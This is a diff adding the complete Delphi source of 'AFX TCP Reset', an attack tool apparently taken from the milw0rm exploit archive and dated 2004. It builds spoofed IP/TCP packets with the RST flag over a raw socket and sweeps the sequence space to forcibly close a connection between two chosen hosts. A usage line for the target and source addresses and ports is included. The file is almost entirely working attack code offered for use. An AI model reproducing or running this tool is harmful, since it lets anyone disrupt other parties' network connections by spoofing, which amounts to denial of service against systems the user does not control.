@@ -1,0 +1,256 @@
+{
+AFX TCP Reset by Aphex
+http://www.iamaphex.cjb.net
+unremote@knology.net
+
+Compile with Delphi 5/6/7
+}
+
+program Project1;
+
+{$APPTYPE CONSOLE}
+
+uses
+Windows;
+
+type
+TBufferArray = array[0..65535] of byte;
+
+type
+iph = record
+ip_verlen: byte;
+ip_tos: byte;
+ip_len: word;
+ip_id: word;
+ip_offset: word;
+ip_ttl: byte;
+ip_protocol: byte;
+ip_checksum: word;
+ip_saddr: longword;
+ip_daddr: longword;
+end;
+
+tcph = record
+th_sport: word;
+th_dport: word;
+th_seq: longword;
+th_ack: longword;
+th_len: byte;
+th_flags: byte;
+th_win: word;
+th_checksum: word;
+th_upr: word;
+end;
+
+sb = packed record
+sb1, sb2, sb3, sb4: char;
+end;
+
+sw = packed record
+sw1, sw2: word;
+end;
+
+TInAddr = record
+case integer of
+0: (ssb: sb);
+1: (ssw: sw);
+2: (saddr: longint);
+end;
+
+TSockAddr = record
+case integer of
+0: (sin_family: word; sin_port: word; sin_addr: TInAddr; sin_zero: array[0..7] of char);
+1: (sa_family: word; sa_data: array[0..13] of char)
+end;
+
+TWSAData = record
+ver: Word;
+hgh: Word;
+dsc: array[0..256] of char;
+sys: array[0..128] of char;
+skt: Word;
+udp: Word;
+ven: PChar;
+end;
+
+function closesocket(sk: integer): integer; stdcall; external 'WS2_32.DLL' name 'closesocket';
+function htons(hs: word): word; stdcall; external 'WS2_32.DLL' name 'htons';
+function htonl(hs: longint): longint; stdcall; external 'WS2_32.DLL' name 'htonl';
+function ntohl(hs: longint): longint; stdcall; external 'WS2_32.DLL' name 'htonl';
+function inet_addr(cp: pchar): longint; stdcall; external 'WS2_32.DLL' name 'inet_addr';
+function sendto(sk: integer; var bf; ln, fl: integer; var ad: TSockAddr; le: integer): 
+integer; stdcall; external 'WS2_32.DLL' name 'sendto';
+function setsockopt(sk: integer; lv, op: integer; ov: PChar; ol: integer): integer; 
+stdcall; external 'WS2_32.DLL' name 'setsockopt';
+function socket(af, st, pr: integer): integer; stdcall; external 'WS2_32.DLL' name 'socket';
+function WSACleanup: integer; stdcall; external 'WS2_32.DLL' name 'WSACleanup'
+function WSAGetLastError: integer; stdcall; external 'WS2_32.DLL' name 'WSAGetLastError';
+function WSAStartup(vr: word; var ws: TWSAData): integer; stdcall; external 'WS2_32.DLL' name 'WSAStartup';
+
+const
+INVALID_SOCKET = integer(not(0));
+
+var
+hSocket: integer;
+WindowPos: int64;
+WindowCount: dword;
+WindowSize: dword;
+TargetHost: string;
+TargetPort: word;
+SourceHost: string;
+SourcePort: word;
+Odds: dword;
+Delay: dword;
+
+function CheckSum(var Buffer; Size: integer): word;
+type
+TWordArray = Array[0..1] of word;
+var
+lSumm: LongWord;
+iLoop: integer;
+begin
+lSumm := 0;
+iLoop := 0;
+while Size > 1 do
+begin
+lSumm := lSumm + TWordArray(Buffer)[iLoop];
+inc(iLoop);
+Size := Size - SizeOf(word);
+end;
+if Size = 1 then lSumm := lSumm + Byte(TWordArray(Buffer)[iLoop]);
+lSumm := (lSumm shr 16) + (lSumm and $FFFF);
+lSumm := lSumm + (lSumm shr 16);
+Result := word(not lSumm);
+end;
+
+procedure Header(FromIP: string; FromPort: word; ToIP: string; ToPort: word; Seq: longint; 
+Window: longint; var Buffer: TBufferArray; var Socket: TSockAddr; var Size: word);
+var
+ipHdr: iph;
+tcpHdr: tcph;
+TcpHeaderLen: word;
+ChecksumSize: word;
+DataPointer: ^byte;
+procedure IncPtr(Value: integer);
+begin
+DataPointer := pointer(integer(DataPointer) + Value);
+end;
+begin
+Size := sizeof(ipHdr) + sizeof(tcpHdr);
+ipHdr.ip_verlen := ((4 shl 4) or sizeof(ipHdr) div sizeof(longword));
+ipHdr.ip_tos := 0;
+ipHdr.ip_len := htons(Size);
+ipHdr.ip_id := 0;
+ipHdr.ip_offset := 0;
+ipHdr.ip_ttl := 128;
+ipHdr.ip_protocol := 6;
+ipHdr.ip_checksum := 0;
+ipHdr.ip_saddr := inet_addr(pchar(FromIP));
+ipHdr.ip_daddr := inet_addr(pchar(ToIP));
+ChecksumSize := 0;
+tcpHdr.th_sport := htons(FromPort);
+tcpHdr.th_dport := htons(ToPort);
+tcpHdr.th_seq := htonl(Seq);
+tcpHdr.th_ack := htonl(Seq + Window);
+tcpHdr.th_len := 80;
+tcpHdr.th_flags := 20;
+tcpHdr.th_win := Window;
+tcpHdr.th_checksum := 0;
+tcpHdr.th_upr := 0;
+DataPointer := @Buffer[0];
+FillChar(Buffer, SizeOf(Buffer), 0);
+Move(ipHdr.ip_saddr, DataPointer^, SizeOf(ipHdr.ip_saddr));
+IncPtr(SizeOf(ipHdr.ip_saddr));
+ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_saddr);
+Move(ipHdr.ip_daddr, DataPointer^, sizeof(ipHdr.ip_daddr));
+IncPtr(SizeOf(ipHdr.ip_daddr));
+ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_daddr);
+IncPtr(1);
+Inc(ChecksumSize);
+Move(ipHdr.ip_protocol, DataPointer^, sizeof(ipHdr.ip_protocol));
+IncPtr(sizeof(ipHdr.ip_protocol));
+ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_protocol);
+TcpHeaderLen := htons(sizeof(tcpHdr));
+Move(TcpHeaderLen, DataPointer^, sizeof(TcpHeaderLen));
+IncPtr(sizeof(TcpHeaderLen));
+ChecksumSize := ChecksumSize + sizeof(TcpHeaderLen);
+Move(tcpHdr, DataPointer^, sizeof(tcpHdr));
+IncPtr(sizeof(tcpHdr));
+ChecksumSize := ChecksumSize + sizeof(tcpHdr);
+tcpHdr.th_checksum := CheckSum(Buffer, ChecksumSize);
+FillChar(Buffer, sizeof(Buffer), 0);
+DataPointer := @Buffer[0];
+Move(ipHdr, DataPointer^, sizeof(ipHdr));
+IncPtr(sizeof(ipHdr));
+Move(tcpHdr, DataPointer^, sizeof(tcpHdr));
+Socket.sin_family := 2;
+Socket.sin_port := htons(0);
+Socket.sin_addr.saddr := inet_addr(pchar(ToIP));
+end;
+
+procedure Send(TargetIP: string; TargetPort: integer; SourceIP: string; SourcePort: integer; 
+Sequence: longint; Window: longint);
+var
+Buffer: TBufferArray;
+Sck: TSockAddr;
+Size: Word;
+begin
+Header(SourceIP, SourcePort, TargetIP, TargetPort, Sequence, Window, Buffer, Sck, Size);
+SendTo(hSocket, Buffer, Size, 0, Sck, sizeof(Sck));
+end;
+
+procedure Init;
+var
+wsdata: TWSAdata;
+op: integer;
+begin
+WSAStartup($0002, wsdata);
+hSocket := Socket(2, 3, 0);
+op := 1;
+SetSockOpt(hSocket, 0, 2, @op, sizeof(op));
+end;
+
+function StrToInt(S: string): integer;
+begin
+Val(S, Result, Result);
+end;
+
+procedure DoExit;
+begin
+WriteLn('AFX TCP Reset');
+WriteLn('http://www.iamaphex.cjb.net');
+WriteLn('unremote@knology.net');
+WriteLn('');
+WriteLn('Usage: reset <src ip> <src port> <dest ip> <dest port> <window size> <send delay> [begin seq num]');
+ExitProcess(0);
+end;
+
+begin
+if Length(ParamStr(1)) < 1 then DoExit;
+if Length(ParamStr(2)) < 1 then DoExit;
+if Length(ParamStr(3)) < 1 then DoExit;
+if Length(ParamStr(4)) < 1 then DoExit;
+if Length(ParamStr(5)) < 1 then DoExit;
+SourceHost := ParamStr(1);
+SourcePort := StrToInt(ParamStr(2));
+TargetHost := ParamStr(3);
+TargetPort := StrToInt(ParamStr(4));
+WindowSize := StrToInt(ParamStr(5));
+Delay := StrToInt(ParamStr(6));
+Randomize;
+WindowPos := Random(4294967295);
+if Length(ParamStr(7)) > 0 then WindowPos := StrToInt(ParamStr(7));
+Odds := 4294967295 div WindowSize;
+WindowCount := 0;
+Init;
+while WindowCount < Odds do
+begin
+if WindowPos > 4294967295 then WindowPos := 0;
+Send(TargetHost, TargetPort, SourceHost, SourcePort, WindowPos, WindowSize);
+Inc(WindowCount);
+Inc(WindowPos, WindowSize);
+Sleep(Delay);
+end;
+end.
+
+// milw0rm.com [2004-04-22]
